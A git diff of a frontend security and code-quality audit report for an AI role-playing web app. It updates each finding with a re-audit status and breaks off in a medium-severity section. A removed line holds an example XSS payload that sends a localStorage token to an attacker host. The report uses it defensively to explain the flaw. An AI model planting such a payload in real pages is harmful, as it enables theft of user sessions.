@@ -1,222 +1,112 @@
-# Comprehensive Codebase Review: `apps/frontend`
+# Comprehensive Codebase Review & Re-Audit: `apps/frontend`
 
 > **Service**: `apps/frontend` (React 18 / Vite 4 / TypeScript 5 Strict / Tailwind CSS / TanStack Query v5 / Zustand v4 / Pixi.js v8)  
-> **Review Scope**: Full-Spectrum Audit (Security, Concurrency & SSE Race Conditions, State Management & Cache Sync, Logic & Edge Cases, Dead Code & Asset Hygiene, [CLAUDE.md](file:///home/aryan-sherigar/projects/AI-DND/CLAUDE.md) Architecture Compliance, Cross-Service Backend Contracts)  
+> **Review Scope**: Full-Spectrum Re-Audit & Defect Verification (Security, Concurrency & SSE Streaming, State Management & Cache Sync, Logic & Edge Cases, Dead Code & Asset Hygiene, [CLAUDE.md](file:///home/aryan-sherigar/projects/AI-DND/CLAUDE.md) Architecture Compliance, Cross-Service Backend Contracts)  
 > **Mode**: Read-Only Architecture & Code Quality Audit (Zero Application Source Code Modifications)  
-> **Date**: September 2026  
+> **Audit Status**: Re-Audited & Verified (September 2026)  
 
 ---
 
-## Executive Summary
+## Executive Summary & Re-Audit Status
 
-An exhaustive review of the [`apps/frontend`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend) client application was conducted across all feature slices (`features/play`, `features/studio`, `features/auth`, `features/landing`, `features/profile`), shared utilities (`src/shared`), application routing, and test suites. The frontend was also cross-verified against backend endpoint schemas and SSE streaming contracts in [`apps/core-api`](file:///home/aryan-sherigar/projects/AI-DND/apps/core-api) and [`apps/turn-resolution-service`](file:///home/aryan-sherigar/projects/AI-DND/apps/turn-resolution-service).
+A comprehensive re-audit of [`apps/frontend`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend) was conducted across all feature slices (`features/play`, `features/studio`, `features/auth`, `features/landing`, `features/profile`, `features/misc`), shared utilities (`src/shared`), application routing, audio/minigame pipelines, and test suites. Every finding from the initial audit report was re-verified against the active codebase, and newly introduced features (scene image generation streaming, studio Lyria music management, cover image generation/upload) were inspected for regressions and edge cases.
 
-### Key Metrics & Audit Outcomes
-- **Automated Test Suite**: 50 test files passed (197 tests total in Vitest) across units and MSW-mocked integration tests.
-- **TypeScript Strictness**: `tsc --noEmit` compiles cleanly with 0 type errors.
-- **Linter Failures**: 16 ESLint problems detected (15 errors, 1 warning) targeting explicit `any` usages and missing React hook dependencies.
-- **Dead Code & Zombie Files**: **19 completely empty (0-byte) abandoned files** exist in `src/`, including empty components (`LoadingSpinner.tsx`, `ErrorBoundary.tsx`, `DiscoveryFeed.tsx`) and empty hooks (`usePagination.ts`, `useDebounce.ts`).
-- **CLAUDE.md Compliance**: 50 functions exceed the 30-line threshold; 15+ nested ternaries detected; 12 explicit `any` annotations found; 0 routes utilize lazy-loading or `<Suspense>`; circular dependency between `shared/lib/api-client.ts` and `features/auth/api/auth.api.ts`; feature isolation violated by `features/play` importing `features/studio`.
+### Re-Audit Key Metrics & Current System Health
+- **Automated Test Suite**: **55 test files passed (227 tests total in Vitest)** across unit tests and MSW-mocked integration tests (an increase from 50 test files / 197 tests).
+- **TypeScript Strictness**: **FAILED (2 Type Errors)**. `tsc --noEmit` fails on `play.store.ts` lines 300 & 371 due to missing `action_mode` on `TurnStreamBody` parameter, currently breaking production build compilation (`npm run build`).
+- **Linter Failures**: **7 ESLint errors** detected (down from 16 problems / 15 errors in initial audit), all targeting `@typescript-eslint/no-explicit-any` across `useAuth.ts`, `SetupPage.tsx`, `Step4Review.tsx`, and `PublishFlow.tsx`.
+- **Dead Code & Zombie Files**: **15 completely empty (0-byte) abandoned files** remain in `src/` (4 cleared: `AppShell.tsx` and `ErrorBoundary.tsx` were populated; `LoadingSpinner.tsx` and `EmptyState.tsx` were removed).
+- **Initial Audit Resolution Rate**: **6 Resolved (23%)**, **4 Partially Resolved (15%)**, **16 Still Active (62%)**.
+- **New Issues Identified**: **5 New Findings** (1 Critical build-breaker, 1 High spectator stream defect, 3 Medium state/UI/lint issues).
+- **Total Active Defect Surface**: **25 Active or Partially Active Issues**.
 
-### Findings Breakdown by Severity
+### Findings Summary Breakdown
 
-| Severity | Count | Primary Impact Areas |
-|---|:---:|---|
-| **Critical (P0)** | 4 | Stored/DOM XSS via `dangerouslySetInnerHTML`, Insecure Iframe Sandbox Escape in Replit Minigames, Unbounded Regex Infinite Loop in Entity Highlighter, Dropped `playthrough_ended` SSE Event & State Desync |
-| **High (P1)** | 5 | Stale Server State Overwriting Optimistic Turn Deltas, Broken Logout / Ghost Session Persistence via Uncleared Refresh Cookie, Module-Scope Regex Action Skipping in Studio AI, Unhandled SSE Termination in `useSSE`, Vanishing Spectator Narration on Turn Completion |
-| **Medium (P2)** | 10 | Circular Layer Dependency (`shared` ↔ `features/auth`), Feature Boundary Violation (`play` importing `studio`), Aggressive SSE Token Whitespace Trimming, SSE CRLF Chunk Splitting Delimiter Bug, Unguarded `loginAsDevUser` Export, Invariant/Condition Grammar Operator Precedence Mismatch, Completely Unprotected Studio/Profile Routes, Missing Query Invalidation on Publish/Duplicate, Animation vs. API Race Condition in `SetupPage`, Ambient Audio State Transition Race Condition |
-| **Low / Standards (P3)** | 7 | 19 0-Byte Zombie Files, Monolithic Initial Bundle (Zero `React.lazy` routes), 50 Functions > 30 Lines, 12 Explicit `any` Annotations, 15+ Nested Ternaries, Missing PixiJS v8 Canvas Teardown (`removeView`), Redundant Monolithic `firebase` Dependency |
-| **Total Findings** | **26** | |
+| Severity Category | Initial Count | Resolved | Partially Resolved | Still Active | New Findings | Total Current Active |
+|---|:---:|:---:|:---:|:---:|:---:|:---:|
+| **Critical (P0)** | 4 | 2 | 1 | 1 | 1 | **3** |
+| **High (P1)** | 5 | 3 | 1 | 1 | 1 | **3** |
+| **Medium (P2)** | 10 | 1 | 0 | 9 | 3 | **12** |
+| **Low / Standards (P3)** | 7 | 0 | 2 | 5 | 0 | **7** |
+| **Total** | **26** | **6** | **4** | **16** | **5** | **25** |
 
 ```mermaid
-pie title Findings Distribution by Category
-    "Security (Critical / Medium)" : 4
-    "Concurrency & SSE Streaming" : 5
-    "State Management & Cache Sync" : 4
-    "Logic Bugs & Edge Cases" : 4
-    "CLAUDE.md Architecture & Layering" : 5
-    "Dead Code & Standards" : 4
+pie title Current Active Defect Surface by Category
+    "Critical (P0: Build & Security)" : 3
+    "High (P1: State & Concurrency)" : 3
+    "Medium (P2: Architecture & Contracts)" : 12
+    "Low (P3: Standards, Dead Code & Lint)" : 7
 ```
 
 ---
 
 ## Severity 0: Critical Vulnerabilities & System Risks
 
-### [CRIT-01] Stored & DOM XSS via Unsanitized `dangerouslySetInnerHTML` in `DistractionFreeEditor`
+### [CRIT-01] [RESOLVED] Stored & DOM XSS via Unsanitized `dangerouslySetInnerHTML` in `DistractionFreeEditor`
 - **Severity**: Critical (P0)
 - **Category**: Security Vulnerability
-- **Location**: [`src/features/studio/components/MarkdownEditor/DistractionFreeEditor.tsx:10-64`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/studio/components/MarkdownEditor/DistractionFreeEditor.tsx#L10-L64)
-- **Problem & Root Cause**:
-  `DistractionFreeEditor` provides Markdown authoring and preview for scenario lore, opening prompts, main conflicts, and narrator instructions across the entire Studio workflow ([`Step2Lore.tsx`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/studio/components/NewbieWizard/Step2Lore.tsx), [`Step3Narrator.tsx`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/studio/components/NewbieWizard/Step3Narrator.tsx), [`OpeningSceneEditor.tsx`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/studio/components/OpeningSceneEditor/OpeningSceneEditor.tsx), [`RulesEditor.tsx`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/studio/components/RulesEditor/RulesEditor.tsx)).
-  Its internal `renderMarkdown` function performs naive regex replacements for bold and italics (`**text**` and `*text*`) and immediately passes the output into `dangerouslySetInnerHTML`:
-  ```typescript
-  return (
-    <p
-      key={index}
-      className="text-zinc-300 leading-relaxed mb-1"
-      dangerouslySetInnerHTML={{ __html: parsedLine }}
-    />
-  );
-  ```
-  The function performs **zero HTML escaping or sanitization** (e.g. via DOMPurify).
-- **Failure Scenario / Impact**:
-  Any scenario authoring field can contain arbitrary HTML/XSS payloads such as `<img src=x onerror="fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'))">` or malicious `<script>` tags. When a scenario is previewed, edited, or duplicated by another user or creator, the malicious JavaScript executes within the victim's session context, compromising Firebase access tokens, user profile data, and session integrity.
-- **Remediation**:
-  Escape raw HTML entities before transforming markdown syntax, or use a secure markdown renderer (such as `react-markdown` with `rehype-sanitize`) without `dangerouslySetInnerHTML`.
-  ```typescript
-  // Remediation in DistractionFreeEditor.tsx
-  function escapeHtml(str: string): string {
-    return str
-      .replace(/&/g, "&amp;")
-      .replace(/</g, "&lt;")
-      .replace(/>/g, "&gt;")
-      .replace(/"/g, "&quot;")
-      .replace(/'/g, "&#039;");
-  }
-
-  const renderMarkdown = (text: string) => {
-    if (!text) return null;
-    const lines = text.split("\n");
-    return lines.map((line, index) => {
-      const safeLine = escapeHtml(line)
-        .replace(/\*\*(.*?)\*\*/g, "<strong>$1</strong>")
-        .replace(/\*(.*?)\*/g, "<em>$1</em>");
-      // Now safe to inject or render via React fragments
-      ...
-    });
-  };
-  ```
+- **Location**: [`src/features/studio/components/MarkdownEditor/DistractionFreeEditor.tsx:1-3, 78-83`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/studio/components/MarkdownEditor/DistractionFreeEditor.tsx#L1-L3)
+- **Re-Audit Verification**: **RESOLVED**
+- **Resolution Details**:
+  `DistractionFreeEditor` has been completely refactored to replace naive regex HTML substitution and `dangerouslySetInnerHTML` with `ReactMarkdown` and `rehypeSanitize`. All user markdown input is parsed into React elements with HTML tags stripped/sanitized by default.
 
 ---
 
-### [CRIT-02] Arbitrary Iframe Execution via Insecure Sandbox Configuration in `ReplitEmbedMinigame`
+### [CRIT-02] [PARTIALLY RESOLVED / ACTIVE RISK] Arbitrary Iframe Execution via Insecure Sandbox Configuration in `ReplitEmbedMinigame`
 - **Severity**: Critical (P0)
 - **Category**: Security Vulnerability
-- **Location**: [`src/features/play/components/MinigameOverlay/ReplitEmbed/ReplitEmbedMinigame.tsx:6, 68`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/components/MinigameOverlay/ReplitEmbed/ReplitEmbedMinigame.tsx#L6)
-- **Problem & Root Cause**:
-  `ReplitEmbedMinigame` embeds creator-supplied Replit minigame URLs into an `<iframe>`:
-  ```typescript
-  const REPLIT_IFRAME_SANDBOX = "allow-scripts allow-same-origin allow-forms";
-  ...
-  <iframe
-    key={attempt}
-    ref={iframeRef}
-    src={replitEmbedUrl}
-    sandbox={REPLIT_IFRAME_SANDBOX}
-    className="w-full h-full border-0"
-    title="Minigame challenge"
-  />
-  ```
-  Per W3C HTML5 specifications and MDN security guidelines, **pairing `allow-scripts` with `allow-same-origin` allows the embedded document to remove its own `sandbox` attribute and escape the sandbox entirely**. Furthermore, the frontend performs no domain validation verifying that `replitEmbedUrl` actually points to an authorized Replit subdomain (`*.replit.dev`, `*.replit.app`, `*.repl.co`).
-- **Failure Scenario / Impact**:
-  If a creator points `replit_embed_url` to a malicious site or an endpoint sharing the frontend origin (or a proxy route), the framed code can execute unsandboxed scripts with full access to `window.parent.localStorage`, hijack the user's session tokens, or spoof game resolution postMessages.
-- **Remediation**:
-  1. Remove `allow-same-origin` from the sandbox attribute (`allow-scripts allow-forms` is sufficient for game interaction while isolating origin storage).
-  2. Enforce strict HTTPS URL validation matching allowed Replit domains before rendering the iframe.
-  ```typescript
-  // Remediation in ReplitEmbedMinigame.tsx
-  const REPLIT_IFRAME_SANDBOX = "allow-scripts allow-forms";
-  const ALLOWED_REPLIT_DOMAINS = [".replit.app", ".replit.dev", ".repl.co"];
-
-  function isAuthorizedReplitUrl(url: string): boolean {
-    try {
-      const parsed = new URL(url);
-      return parsed.protocol === "https:" && 
-        ALLOWED_REPLIT_DOMAINS.some(d => parsed.hostname.endsWith(d));
-    } catch {
-      return false;
-    }
-  }
-  ```
+- **Location**: [`src/features/play/components/MinigameOverlay/ReplitEmbed/ReplitEmbedMinigame.tsx:11, 73-80`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/components/MinigameOverlay/ReplitEmbed/ReplitEmbedMinigame.tsx#L11)
+- **Re-Audit Verification**: **PARTIALLY RESOLVED / ACTIVE RISK**
+- **Current Code State**:
+  - `allow-same-origin` was successfully removed from the iframe sandbox; `REPLIT_IFRAME_SANDBOX` now safely specifies `"allow-scripts allow-forms"`.
+  - **Remaining Vulnerability**: Strict HTTPS domain validation matching authorized Replit domains (`*.replit.app`, `*.replit.dev`, `*.repl.co`) is **still not implemented**. An arbitrary creator-provided URL (e.g. `javascript:...` or an unvetted third-party origin) is passed directly to `src={replitEmbedUrl}` without validation.
+- **Remediation Required**:
+  Add an origin check in `ReplitEmbedMinigame.tsx` ensuring `new URL(replitEmbedUrl).hostname` ends with an allowed Replit domain before rendering the iframe.
 
 ---
 
-### [CRIT-03] Browser Tab Freeze via Regex Infinite Loop in `renderHighlightedText`
+### [CRIT-03] [ACTIVE] Browser Tab Freeze via Regex Infinite Loop in `renderHighlightedText`
 - **Severity**: Critical (P0)
 - **Category**: Logic Bug / Denial of Service
-- **Location**: [`src/features/play/components/PlayScreen/EBook/EBookTurnEntry.tsx:45-56`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/components/PlayScreen/EBook/EBookTurnEntry.tsx#L45-L56) and [`src/features/play/components/PlayScreen/EBook/useEntityHighlighter.ts:18-20, 46-49`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/components/PlayScreen/EBook/useEntityHighlighter.ts#L18-L20)
-- **Problem & Root Cause**:
-  `EBookTurnEntry` dynamically builds a regular expression to highlight known entities in narrative paragraphs:
+- **Location**: [`src/features/play/components/PlayScreen/EBook/EBookTurnEntry.tsx:43-56`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/components/PlayScreen/EBook/EBookTurnEntry.tsx#L43-L56)
+- **Re-Audit Verification**: **STILL ACTIVE**
+- **Current Code State**:
+  Lines 43-49 remain unchanged:
   ```typescript
+  if (!entities.length) return [text];
   const sorted = [...entities].sort((a, b) => b.name.length - a.name.length);
   const regex = new RegExp(
     `\\b(${sorted.map((e) => escapeRegExp(e.name)).join("|")})\\b`,
     "gi",
   );
-  while ((match = regex.exec(text)) !== null) {
-    ...
-    lastIndex = regex.lastIndex;
-  }
   ```
-  In `useEntityHighlighter.ts`, entities are built from `storyCards`, `keyFacts`, and `masterEntities`. If an entity has an empty alias `""`, a blank story card name, or a fact starting with `:`, `e.name` resolves to `""`.
-  When `escapeRegExp("")` is joined by `|`, the regex contains `\\b(|...)\\b`. An empty string match matches at index 0 without consuming any characters.
-- **Failure Scenario / Impact**:
-  Because `regex.exec(text)` continually matches an empty string at index 0, `regex.lastIndex` never advances. The `while` loop runs infinitely, locking the JavaScript main thread and permanently freezing the player's browser tab upon opening any chapter with an unnamed entity.
-- **Remediation**:
-  Filter out entities with empty or whitespace-only names before sorting and constructing the regular expression. If no valid entities remain, return the raw text immediately.
-  ```typescript
-  // Remediation in EBookTurnEntry.tsx
-  const validEntities = entities.filter((e) => e.name && e.name.trim().length > 0);
-  if (!validEntities.length) return [text];
-
-  const sorted = [...validEntities].sort((a, b) => b.name.length - a.name.length);
-  const pattern = sorted.map((e) => escapeRegExp(e.name.trim())).join("|");
-  const regex = new RegExp(`\\b(${pattern})\\b`, "gi");
-  ```
+  If any entity has `name === ""` or whitespace-only (e.g., from an empty alias or malformed key fact), `regex.exec(text)` continually matches at index 0, `regex.lastIndex` never advances, and the `while` loop locks the browser tab indefinitely.
+- **Remediation Required**:
+  Pre-filter entities with `const validEntities = entities.filter(e => e.name && e.name.trim().length > 0);` before sorting and compiling the regex.
 
 ---
 
-### [CRIT-04] Playthrough Ended Event Dropped & Turn State Desynchronization
+### [CRIT-04] [RESOLVED] Playthrough Ended Event Dropped & Turn State Desynchronization
 - **Severity**: Critical (P0)
 - **Category**: Concurrency & SSE Contract Mismatch
-- **Location**: [`src/features/play/stores/play.store.ts:299-325, 397-399`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/stores/play.store.ts#L299-L325) and [`apps/turn-resolution-service/app/turn/pipeline.py:235`](file:///home/aryan-sherigar/projects/AI-DND/apps/turn-resolution-service/app/turn/pipeline.py#L235)
-- **Problem & Root Cause**:
-  In `turn-resolution-service`, when an end condition evaluates to true (victory or defeat), `pipeline.py` emits a `playthrough_ended` SSE event carrying the outcome:
-  ```python
-  yield response_streamer.playthrough_ended_event(outcome_tag, outcome_title, outcome_text)
-  ```
-  In [`play.store.ts`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/stores/play.store.ts), the SSE event handler explicitly switches on `mood`, `narration`, `turn_summary`, `minigame`, `done`, and `degraded`.
-  **The event `playthrough_ended` is completely omitted from the switch statement.**
-  Furthermore, when `done` arrives, `_commitStreamedTurn` only invalidates:
-  ```typescript
-  void queryClient.invalidateQueries({
-    queryKey: ["playthrough-turns", playthrough.playthrough_id],
-  });
-  ```
-  It **never invalidates** `["playthrough", playthrough.playthrough_id]`.
-- **Failure Scenario / Impact**:
-  When a player reaches the climax of a campaign and wins or dies, the `playthrough_ended` payload is silently ignored. Because `["playthrough", id]` is not invalidated, the local playthrough state remains in `status: "in_progress"`. The victory/game-over screen never appears, and the player can continue typing and submitting invalid turns against an already-terminated game session.
-- **Remediation**:
-  1. Add a `pending_playthrough_ended` field to `PlayStoreState` and handle `playthrough_ended` in the SSE handler.
-  2. On `_commitStreamedTurn`, commit the ending outcome and invalidate both `["playthrough-turns", id]` AND `["playthrough", id]`.
-  ```typescript
-  // Remediation in play.store.ts
-  } else if (eventName === "playthrough_ended") {
-    const payload = JSON.parse(data);
-    set({ pending_game_over: payload });
-  }
-  ...
-  // In _commitStreamedTurn:
-  void queryClient.invalidateQueries({
-    queryKey: ["playthrough", playthrough.playthrough_id],
-  });
-  void queryClient.invalidateQueries({
-    queryKey: ["playthrough-turns", playthrough.playthrough_id],
-  });
-  ```
+- **Location**: [`src/features/play/stores/play.store.ts:558-562, 636-669`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/stores/play.store.ts#L558-L562)
+- **Re-Audit Verification**: **RESOLVED**
+- **Resolution Details**:
+  1. Handled `playthrough_ended` SSE event in `play.store.ts` via `pending_playthrough_ended`.
+  2. In `_commitStreamedTurn`, the buffered outcome tags (`ended_outcome_tag`, `ended_outcome_title`, `ended_outcome_text`) are promoted onto the committed `playthrough` object.
+  3. `_commitStreamedTurn` now invalidates both `["playthrough-turns", playthrough.playthrough_id]` and `["playthrough", playthrough.playthrough_id]`.
 
 ---
 
 ## Severity 1: High Priority Deficiencies
 
-### [HIGH-01] Stale Server State Overwriting Optimistic Turn Deltas
+### [HIGH-01] [ACTIVE] Stale Server State Overwriting Optimistic Turn Deltas
 - **Severity**: High (P1)
 - **Category**: State Management & Cache Synchronization
-- **Location**: [`src/features/play/pages/PlayPage.tsx:47-67`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/pages/PlayPage.tsx#L47-L67) and [`src/features/play/stores/play.store.ts:139-155`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/stores/play.store.ts#L139-L155)
-- **Problem & Root Cause**:
-  `PlayPage` establishes an effect that calls `setPlaythrough(playthroughData)` whenever `serverPlaythrough` or `turnsData` changes.
-  When a turn finishes streaming, `play.store.ts` locally appends the turn and updates state in `_commitStreamedTurn`, then invalidates `["playthrough-turns", id]`.
-  When `usePlaythroughTurns` refetches, `turnsData` updates. This triggers `PlayPage`'s effect:
+- **Location**: [`src/features/play/pages/PlayPage.tsx:47-67`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/pages/PlayPage.tsx#L47-L67) and [`src/features/play/stores/play.store.ts:193-198`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/stores/play.store.ts#L193-L198)
+- **Re-Audit Verification**: **STILL ACTIVE**
+- **Current Code State**:
+  In `PlayPage.tsx`, the synchronization effect executes whenever either `serverPlaythrough` OR `turnsData` updates:
   ```typescript
   useEffect(() => {
     if (!serverPlaythrough) return;
@@ -226,371 +116,374 @@ pie title Findings Distribution by Category
     setPlaythrough(playthroughData);
   }, [serverPlaythrough, turnsData, isSpectatorMode, setPlaythrough]);
   ```
-  Because `serverPlaythrough` was never re-fetched, `buildMasterPlaythroughData` receives the **stale `serverPlaythrough` snapshot from turn 0**.
-- **Failure Scenario / Impact**:
-  `setPlaythrough` completely overwrites the store's `playthrough` object with the stale server snapshot, reverting player health, inventory changes, and active conditions back to their pre-turn values.
-- **Remediation**:
-  Invalidate `["playthrough", id]` alongside turns, and merge turn state updates atomically rather than doing a destructive wholesale overwrite of the local store.
+  When `turnsData` finishes refetching after a turn stream commits, `serverPlaythrough` refetch may still be in-flight. `PlayPage` immediately executes `setPlaythrough` with the stale `serverPlaythrough` snapshot from the start of the turn, temporarily rolling back player health, inventory, and stats.
+- **Remediation Required**:
+  Ensure state delta reconciliation occurs atomically or guard `PlayPage` effect against overwriting store state with a stale server snapshot whose `turn_count` is less than the current committed local turn count.
 
 ---
 
-### [HIGH-02] Broken Logout / Ghost Session Persistence via Uncleared Refresh Token Cookie
+### [HIGH-02] [RESOLVED] Broken Logout / Ghost Session Persistence via Uncleared Refresh Token Cookie
 - **Severity**: High (P1)
 - **Category**: Authentication & Session Security
-- **Location**: [`src/features/auth/hooks/useAuth.ts:42-47`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/auth/hooks/useAuth.ts#L42-L47) and [`src/features/auth/providers/AuthProvider.tsx:12-25`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/auth/providers/AuthProvider.tsx#L12-L25)
-- **Problem & Root Cause**:
-  Core API stores session refresh tokens in an `HttpOnly` cookie (`path=/v1/auth/refresh`).
-  When a user logs out in `useAuth.ts`:
-  ```typescript
-  const logout = async () => {
-    if (auth.currentUser) {
-      await auth.signOut();
-    }
-    storeLogout();
-  };
-  ```
-  `storeLogout()` merely clears the Zustand in-memory state. Because `refresh_token` is `HttpOnly`, client-side JS cannot delete it. The frontend never issues a POST request to invalidate or expire the cookie.
-  When the user reloads the page or opens a new tab, `AuthProvider.tsx` mounts:
-  ```typescript
-  useEffect(() => {
-    const initAuth = async () => {
-      try {
-        const { access_token, user } = await refreshAccessToken();
-        setAuth(access_token, user);
-      } ...
-    };
-    initAuth();
-  }, ...);
-  ```
-  The browser automatically includes the uncleared `refresh_token` cookie, which the backend accepts, issuing a new access token and logging the user back in.
-- **Failure Scenario / Impact**:
-  Users on shared or public computers who click "Log Out" are never actually logged out; anyone reopening the browser tab is immediately authenticated into their account.
-- **Remediation**:
-  Add an explicit `/v1/auth/logout` endpoint in Core API that sets `max_age=0` on `refresh_token`, and call this endpoint from `useAuth.logout` before clearing local state.
+- **Location**: [`src/features/auth/hooks/useAuth.ts:42-54`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/auth/hooks/useAuth.ts#L42-L54) and [`src/features/auth/api/auth.api.ts:18-20`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/auth/api/auth.api.ts#L18-L20)
+- **Re-Audit Verification**: **RESOLVED**
+- **Resolution Details**:
+  1. `core-api` added `POST /v1/auth/logout` endpoint that sets `max_age=0` on the `refresh_token` cookie.
+  2. `auth.api.ts` defines `logoutUser()`.
+  3. `useAuth.ts` invokes `await logoutUser()` before clearing local store tokens and signing out of Firebase.
 
 ---
 
-### [HIGH-03] Module-Scope Regex Action Skipping in Studio AI Assistant
+### [HIGH-03] [RESOLVED] Module-Scope Regex Action Skipping in Studio AI Assistant
 - **Severity**: High (P1)
 - **Category**: Logic Bug / Concurrency
-- **Location**: [`src/features/studio/components/AIChatSidebar/parseActionBlocks.ts:15-16, 36-60`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/studio/components/AIChatSidebar/parseActionBlocks.ts#L15-L16)
-- **Problem & Root Cause**:
-  `ACTION_BLOCK_REGEX` is declared at module scope with the `/g` flag:
-  ```typescript
-  const ACTION_BLOCK_REGEX =
-    /```action:([a-z_]+)(?:[ \t]+(\{[^}\n]*\}))?\s*\n([\s\S]*?)```/gi;
-  ```
-  In JavaScript, `RegExp.prototype.exec` maintains stateful `lastIndex` on `/g` regex instances across consecutive invocations. When `parseMessageSegments(content)` is invoked across multiple chat messages or during streaming token updates, `ACTION_BLOCK_REGEX.lastIndex` is not reset to 0.
-- **Failure Scenario / Impact**:
-  Action blocks at the beginning of subsequent messages are completely skipped because `exec` searches from the offset where the prior message finished. Creators miss critical AI action proposals (cards, prompts, rules) in the Studio sidebar.
-- **Remediation**:
-  Reset `ACTION_BLOCK_REGEX.lastIndex = 0;` at the entry of `parseMessageSegments`, or instantiate the regex locally inside the function.
-  ```typescript
-  export const parseMessageSegments = (content: string): MessageSegment[] => {
-    ACTION_BLOCK_REGEX.lastIndex = 0;
-    const segments: MessageSegment[] = [];
-    ...
-  ```
+- **Location**: [`src/features/studio/components/AIChatSidebar/parseActionBlocks.ts:42`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/studio/components/AIChatSidebar/parseActionBlocks.ts#L42)
+- **Re-Audit Verification**: **RESOLVED**
+- **Resolution Details**:
+  `parseMessageSegments` explicitly resets `ACTION_BLOCK_REGEX.lastIndex = 0;` at function entry, preventing cross-message offset carry-over.
 
 ---
 
-### [HIGH-04] Unhandled SSE Stream Termination in `useSSE` (Silent Connection Hang)
+### [HIGH-04] [RESOLVED] Unhandled SSE Stream Termination in `useSSE`
 - **Severity**: High (P1)
 - **Category**: Concurrency & Connection Lifecycle
-- **Location**: [`src/shared/hooks/useSSE.ts:30-34`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/shared/hooks/useSSE.ts#L30-L34) and [`src/shared/lib/sse-client.ts:18-25, 126`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/shared/lib/sse-client.ts#L18-L25)
-- **Problem & Root Cause**:
-  `sse-client.ts` specifically invokes `handlers.onClose?.()` when the HTTP stream ends normally without throwing a fetch error.
-  However, `useSSE.ts` only registers `onEvent`, `onOpen`, and `onError`:
-  ```typescript
-  const handlers: SSEHandlers = {
-    onEvent: (name, data) => onEventRef.current(name, data),
-    onOpen: () => setStatus("open"),
-    onError: () => setStatus("closed"),
-  };
-  ```
-  It completely omits `onClose`.
-- **Failure Scenario / Impact**:
-  If the server closes the SSE connection gracefully or an intermediary terminates the stream, `useSSE` status remains `"open"` forever. Consumers like `useNotifications` and `useSpectator` never detect the drop, and the UI never attempts reconnection or displays a disconnected indicator.
-- **Remediation**:
-  Implement `onClose: () => setStatus("closed")` in `useSSE.ts`.
+- **Location**: [`src/shared/hooks/useSSE.ts:34`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/shared/hooks/useSSE.ts#L34)
+- **Re-Audit Verification**: **RESOLVED**
+- **Resolution Details**:
+  `useSSE.ts` now registers `onClose: () => setStatus("closed")` in `handlers`, correctly transitioning connection status when the server terminates an SSE stream cleanly.
 
 ---
 
-### [HIGH-05] Vanishing Narration in Spectator Mode upon Turn Completion
+### [HIGH-05] [PARTIALLY RESOLVED / ACTIVE] Vanishing Narration in Spectator Mode upon Turn Completion
 - **Severity**: High (P1)
 - **Category**: Logic Bug / UI State
-- **Location**: [`src/features/play/hooks/useSpectator.ts:28-31`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/hooks/useSpectator.ts#L28-L31)
-- **Problem & Root Cause**:
-  In `useSpectator`:
+- **Location**: [`src/features/play/hooks/useSpectator.ts:37-45`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/hooks/useSpectator.ts#L37-L45)
+- **Re-Audit Verification**: **PARTIALLY RESOLVED / ACTIVE**
+- **Current Code State**:
+  In `useSpectator.ts`:
   ```typescript
   } else if (eventName === "done") {
     setIsLive(false);
+    if (playthroughId) {
+      void queryClient.invalidateQueries({
+        queryKey: ["playthrough-turns", playthroughId],
+      });
+    }
     setStreamingText("");
   }
   ```
-  When `"done"` arrives, `streamingText` is immediately wiped to `""`. However, `useSpectator` does not trigger query invalidation on `["playthrough-turns", playthroughId]`.
-- **Failure Scenario / Impact**:
-  The live narration chunk that the spectator was reading abruptly vanishes from the screen, and because the turn history query has not refetched, the committed turn does not appear in the log. The spectator sees an empty screen until manually refreshing the browser.
-- **Remediation**:
-  Invalidate `["playthrough-turns", playthroughId]` before or immediately upon receiving `"done"`, or delay clearing `streamingText` until the updated turn history query has resolved.
+  `queryClient.invalidateQueries` was introduced; however, `setStreamingText("")` is still invoked **immediately and synchronously** in the same tick. Because the query refetch takes 100-400ms over HTTP, the live narration vanishes from the spectator screen before the new turn appears in `turns`, causing an abrupt blank flash.
+- **Remediation Required**:
+  Retain `streamingText` until `playthrough-turns` refetch has resolved, or clear it only after the turns query cache is updated.
 
 ---
 
 ## Severity 2: Medium Priority Architectural & Operational Issues
 
-### [MED-01] Cyclic Layer Dependency: `shared/lib/api-client.ts` ↔ `features/auth`
+### [MED-01] [ACTIVE] Cyclic Layer Dependency: `shared/lib/api-client.ts` ↔ `features/auth`
 - **Severity**: Medium (P2)
 - **Category**: Architecture Boundary Violation
